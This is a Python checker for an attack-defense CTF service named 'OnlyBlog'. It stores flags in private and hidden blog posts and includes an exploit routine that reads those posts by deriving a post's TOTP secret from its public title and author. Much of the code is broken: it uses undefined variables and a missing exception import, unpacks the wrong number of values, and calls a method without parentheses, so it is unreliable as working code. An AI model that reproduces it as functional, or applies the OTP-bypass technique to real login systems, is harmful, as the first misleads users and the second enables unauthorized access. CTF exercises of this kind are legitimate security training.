import json
import os
import re
import secrets
import string
import hashlib
import hmac
from itertools import zip_longest
from logging import LoggerAdapter
from typing import List, Optional, Tuple
from bs4 import BeautifulSoup
from datetime import timezone
import datetime
from logging import LoggerAdapter

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
)
from enochecker3.utils import FlagSearcher, assert_equals, assert_in
from httpx import AsyncClient, Request, Response

"""

"""
SERVICE_PORT = 5000
checker = Enochecker("OnlyBlog", SERVICE_PORT)
app = lambda: checker.app
"""

"""

class Totp_Client:
    def __init__(self,
                 init_time,
                 num_digits: int=6):

        self.secret_key = ""
        self.init_time = init_time
        self.timestep = 30
        self.timestep_counter = 0
        if num_digits > 10 or num_digits < 6:
            raise ValueError("The number of digits for the OTP must be between 6 and 10")
        self.num_digits = num_digits

    def generate_shared_secret(self, secret: str=""):
        if not secret:
            if not self.secret_key:
                secret_phrase = "Correct horse battery staple!"
                secret_key_tmp = hashlib.sha256(self.secret_phrase.encode())
                self.secret_key = secret_key_tmp.digest()
        else:
            if not self.secret_key:
                secret_key_tmp = hashlib.sha256(secret.encode())
                self.secret_key = secret_key_tmp.digest()
        return

    def force_secret_override(self, new_secret):
        secret_key_tmp = hashlib.sha256(new_secret.encode())
        self.secret_key = secret_key_tmp.digest()
        return

    def generate_otp(self, shared_secret: bytes, timestep_counter: int):
        hmac_result = hmac.new(shared_secret, bytes(timestep_counter), hashlib.sha1)
        bin_code = self.truncate(bytearray(hmac_result.digest()))
        return int(bin_code) % 10**self.num_digits

    #return 4 byte/31 bit value
    def truncate(self, hmac_result: bytearray):
        offset = hmac_result[-1] & 0xf
        bin_code = ( (hmac_result[offset] & 0x7f) << 24
                    |(hmac_result[offset+1] & 0xff) << 16
                    |(hmac_result[offset+2] & 0xff) << 8
                    |(hmac_result[offset+3] & 0xff)
                    )
        return bin_code

    def calculate_current_timestep_count(self):
        dt = datetime.datetime.now(timezone.utc)
        time_diff = int(dt.timestamp()) - int(self.init_time) # floor the diff or fllor individually?
        steps = int(time_diff/self.timestep)
        self.timestep_counter = steps
        return


async def register_user(task, client: AsyncClient, logger):
    username = ''.join(secrets.choice(string.ascii_letters+string.digits) for i in range(10))
    password = ''.join(secrets.choice(string.ascii_letters+string.digits) for i in range(25))
    logger.debug(f"New user registration. Username: {username}, Password: {password}")

    formdata = {"username": username, "password": password, "rpassword": password}
    r = await client.post("/auth/register", data=formdata)
    assert_equals(r.status_code, 302, "Registration error in register user function.")
    return username, password

async def login_user(task, client, logger, username, password):
    logger.debug(f"Logging in user: {username}, with password: {password}")
    formdata = {"username": username, "password": password}
    r = await client.post("auth/login", data=formdata)
    assert_equals(r.status_code, 302, "Login Error in login_user function.")
    logger.debug(f"Successfully loggen in user: {username}, with password: {password}")
    return r.cookies

async def create_blogpost(client, logger, cookie, flag, is_private, is_hidden, inviteduser=''):
    title = ''.join(secrets.choice(string.ascii_letters+string.digits) for i in range(25))
    secret = ''.join(secrets.choice(string.ascii_letters+string.digits) for i in range(25))
    body = flag
    formdata = {"title": title, "body": body, "inviteuser": inviteduser, "secret phrase": secret}
    if is_private:
        formdata["private"] = "True"

    if is_hidden:
        formdata["hidden"] = "True"

    r = await client.post("/create", data=formdata, cookies=cookie)
    assert_equals(r.status_code, 302, "Blogpost creation error in create_blogpost function.")

    if is_hidden:
        f = await client.get(r.headers['Location'], cookies=cookie)
     # parse html to get the post_id
        html = BeautifulSoup(f.text, "html.parser")
        article = html.find('article', attrs={"class":"post"})
        el_a = article.find('a', attrs={"class":"action"})
        postid = el_a['href'].split('/')[1]
        logger.debug(f"postid is: {postid}")
        return title, secret, postid
    return title, secret

async def logout_user(client, logger, username):
    r = await client.get('auth/logout')
    logger.debug(f"logged out: {username}")
    assert_equals(r.status_code, 302, "Logout did not redirect to index")
    return

# Deposit a flag in a private user post.
# Puts the post title attackinfgo
@checker.putflag(0)
async def putflag_zero(
    task: PutflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> str:
    """
    TODO:
        - register a user and store credentials
        - login as user with valid username, password
        - register another user and invite him
        - create a new blogpost with a valid title, put the flag as the body and make it private
        - logout
    """
    flag = task.flag
    author, apassword = await register_user(task, client, logger)
    authorcookie = await login_user(task, client, logger, author, apassword)
    user_to_invite, upassword = await register_user(task, client, logger)

    title, secret = await create_blogpost(client, logger, authorcookie, flag, is_private=True, is_hidden=False, inviteduser=user_to_invite)
    await logout_user(client, logger, author)

    await db.set("nec_info", (title, user_to_invite, upassword))
    attackinfo = {"title": title}
    return json.dumps(attackinfo)


# Deposit a flag in a hidden user post.
@checker.putflag(1)
async def putflag_one(
    task: PutflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> str:
    """
    TODO:
        - register a user and store credentials
        - login as user with valid username, password
        - register another user and invite him
        - create a new blogpost with a valid title, put the flag as the body and make it private
        - logout
    """
    flag = task.flag
    author, apassword = await register_user(task, client, logger)
    authorcookie = await login_user(task, client, logger, author, apassword)
    user_to_invite, upassword = await register_user(task, client, logger)

    title, secret, postid= await create_blogpost(client, logger, authorcookie, flag, is_private=False, is_hidden=True, inviteduser=user_to_invite)
    await logout_user(client, logger, author)

    await db.set("nec_info", (title, user_to_invite, upassword, secret))
    attackinfo = {"postid": postid}
    return json.dumps(attackinfo)


def getdata_from_accountinfo(response, client, logger, title):
    try:
        html = BeautifulSoup(response.text, "html.parser")
        el_article = html.find_all('article', attrs={"class":"post"})

        for article in el_article:
            el_h4 = article.find('h4')
            if el_h4 is None:
                break
            ftitle = el_h4.string
            ftitle = ftitle.split("to: ")[1]

            if ftitle == title:
                el_div_date = article.find("div", attrs={"class":"about"})
                date = el_div_date.string
                date = date.split(": ")[1]

                el_div_postkey = article.find("div", attrs={"class":"totp-info"})
                postkey = el_div_postkey.string
                postkey = postkey.split("event key is: ")[1]

                el_a = article.find('a', attrs={"class":"action"})
                posturl = el_a['href']
                return date, postkey, posturl

        raise MumbleException("relevant data could not be retrieved from Account Info...")
    except:
        msg = f"post with title {title} could not be found"
        raise MumbleException(msg)


"""
    TODO:
        - retrieve valid credentials from DB
        - login as the user and view your account info
        - find the event with the given title and parse time and key
        - access the desired post
        - retrieve the flag from the posts body
"""
@checker.getflag(0)
async def getflag_zero(
    task: GetflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB
) -> None:

    try:
        userdata = await db.get("nec_info")
    except KeyError:
        #is mumble here correct or will lead to deduction in points?
        raise MumbleException("Missing database entry from putflag operation.")

    cookie = await login_user(task, client, logger, username=userdata[1], password=userdata[2])
    r = await client.get('/auth/accountInfo', cookies=cookie)
    logger.debug(f"accessing accountinfo: {r.text}")
    date, postkey, posturl = getdata_from_accountinfo(r, client, logger, userdata[0])
    timestamp = convert_str_to_unixtimestamp(date)

    totp_device = Totp_Client(init_time=timestamp)
    totp_device.generate_shared_secret(postkey)
    totp_device.calculate_current_timestep_count()
    usercode = totp_device.generate_otp(totp_device.secret_key, totp_device.timestep_counter)
    logger.debug(f"accessing post: {userdata[0]}, timestamp: {timestamp}, usercode: {usercode}")

    r = await client.post(posturl, data={"code":usercode}, cookies=cookie)
    logger.debug(f"response: {r.text}")
    assert_in(task.flag, r.text, "The flag could not be retrieved in the getflag method.")

    await logout_user(client, logger, userdata[0])
    return

@checker.getflag(1)
async def getflag_one(
    task: GetflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB
) -> None:

    try:
        userdata = await db.get("nec_info")
    except KeyError:
        #is mumble here correct or will lead to deduction in points?
        raise MumbleException("Missing database entry from putflag operation.")

    cookie = await login_user(task, client, logger, username=userdata[1], password=userdata[2])
    r = await client.get('/auth/accountInfo', cookies=cookie)
    logger.debug(f"accessing accountinfo: {r.text}")
    date, postkey, posturl = getdata_from_accountinfo(r, client, logger, userdata[0])
    timestamp = convert_str_to_unixtimestamp(date)

    totp_device = Totp_Client(init_time=timestamp)
    totp_device.generate_shared_secret(postkey)
    totp_device.calculate_current_timestep_count()
    usercode = totp_device.generate_otp(totp_device.secret_key, totp_device.timestep_counter)
    logger.debug(f"accessing post: {userdata[0]}, timestamp: {timestamp}, usercode: {usercode}")

    r = await client.post(posturl, data={"code":usercode}, cookies=cookie)
    logger.debug(f"response: {r.text}")
    assert_in(task.flag, r.text, "The flag could not be retrieved in the getflag method.")

    await logout_user(client, logger, userdata[0])
    return

#find timestamp and postid for post given by title
def find_params(r, username, postid, title):
    try:
        html = BeautifulSoup(r.text, "html.parser")
        el_article = html.find_all('article', attrs={"class":"post"})
        for article in el_article:
            el_h1 = article.find('h1')
            if el_h1.string == title:
                el_div = article.find("div", attrs={"class":"about"})
                spliddy = el_div.string.split(' ')
                name = spliddy[1]
                time = spliddy[-2:]
                el_a = article.find('a', attrs={"class":"action"})
                post_id = el_a['href'].split('/')[-1]
                return time, post_id, name
    except:
        msg = f"post with id {postid} could not be found"
        raise MumbleException(msg)


def convert_str_to_unixtimestamp(timestr):
    #date = time[0]
    #timec = time[1]
    #timec = timec.split('.', 1)[0]

    date, timec = timestr.split(' ', 1)
    datecomp=date.split('-')
    timecomp=timec.split(':')
    if len(timecomp) == 2:
        #create new aware datetime object from date and time components, note that we do not have seconds.
        dto = datetime.datetime(int(datecomp[0]), int(datecomp[1]), int(datecomp[2]), int(timecomp[0]), int(timecomp[1]), tzinfo=timezone.utc)
        return dto.timestamp()
    elif len(timecomp) == 3:
        dto = datetime.datetime(int(datecomp[0]), int(datecomp[1]), int(datecomp[2]), int(timecomp[0]), int(timecomp[1]), int(timecomp[2]), tzinfo=timezone.utc)
        return dto.timestamp()
    else:
        raise MumbleException("Unexpected timestamp format!")


@checker.exploit(0)
async def exploit_zero(task: ExploitCheckerTaskMessage,
                       searcher: FlagSearcher,
                       client: AsyncClient,
                       logger: LoggerAdapter
                       ) -> Optional[str]:
    """
    TODO:
        - register a new user
        - login as the new user with valid credentials and totp
        - access the private event by
            - reading the creation time and creating a timestamp from it
            - generating the secret key
            - calculating the totp.
    """
    if task.attack_info == "":
        raise InternalErrorException("Missing attack info for exploit")
    attackinfo = json.loads(task.attack_info)
    title = attackinfo['title']
    postid = attackinfo['postid']
    username, password, secret = await register_user(task, client, logger)
    cookie = await login_user(task, client,logger, username, password)

    #access the index, identify post through unique title and gather necessary infos
    r = await client.get("/", cookies=cookie)
    # use the title to find relevant info
    time, post_id, author = find_params(r, username, postid, title)
    postkey = str(title) + str(author)
    #first timestamp is always ON THE MINUTE, the second is ON EVERY HALF-MINUTE
    timestamp = int(convert_str_to_unixtimestamp(time))
    totp_device = Totp_Client(init_time=timestamp)
    totp_device.generate_shared_secret(postkey)
    totp_device.calculate_current_timestep_count()

    #60 divided by range -> length of validity period
#    for i in range(5):

    dt = datetime.datetime.now(timezone.utc)
    end = int(dt.timestamp())+3
    while int(dt.timestamp) <= end:

        usercode = totp_device.generate_otp(totp_device.secret_key, totp_device.timestep_counter+i)
        logger.debug(f"round: {i}, user: {username}, accessing post: {title}, timestamp: {timestamp}, usercode: {usercode}")
        r = await client.post("auth/accessblogpost/"+ str(post_id), data={"code":usercode}, cookies=cookie)
        logger.debug(f"response: {r.text}")
        html = BeautifulSoup(r.text, "html.parser")
        body = html.find('p', attrs={"class":"body"})
        if body is not None:
            logger.debug(f"paragraph: {body.string}")
            if flag := searcher.search_flag(r.text):
                #await logout_user(client, logger, username)
                return flag
    #await logout_user(client, logger, username)
    raise MumbleException("Flag not found in exploit")

    #assert_equals(r.status_code, 200, "Wrong status code in exploit function, @totp")
    #assert_in(task.flag, r.text, "flag was not found in blogpost")
